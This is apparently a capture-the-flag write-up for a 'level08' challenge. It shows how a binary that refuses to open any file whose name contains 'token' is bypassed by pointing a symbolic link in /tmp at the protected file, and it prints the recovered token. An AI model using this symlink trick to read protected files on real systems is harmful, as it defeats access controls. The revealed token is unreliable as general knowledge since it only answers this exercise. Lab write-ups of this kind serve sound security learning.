# We have two file, binary level08 and token, token on group flag08
# We run ./level08
./level08 [file to read]

# Token ?
./level08 token
> You may not access 'token'

# Search time, STRINGS COMMING

# strings level08 ...?
%s [file to read]
token 🧐
You may not access '%s'
Unable to open %s
Unable to read fd %d

# ¿ TOKEN HARDCODED ?, why ...? 
# Maybe if token in name?
./level08 /tmp/tokentest
> You may not access '/tmp/tokentest' 🤯

# Symbolic link might work ?
ln -s ~/token /tmp/paprika
./level08 /tmp/paprika
> quif5eloekouj29ke0vouxean

# IT'S FLAG TIME 🥵

